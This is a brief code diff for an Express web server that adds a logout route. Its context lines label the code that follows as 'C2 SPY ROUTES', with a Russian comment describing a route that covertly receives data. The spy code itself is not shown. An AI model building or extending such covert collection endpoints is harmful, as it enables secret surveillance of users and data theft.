@@ -97,6 +97,11 @@ app.post('/login', (req, res) => {
     });
 });
 
+app.get('/logout', (req, res) => {
+    res.clearCookie('session_data');
+    res.redirect('/login');
+});
+
 // === C2 SPY ROUTES ===
 
 // 1. Шпионский роут (принимает данные скрытно)
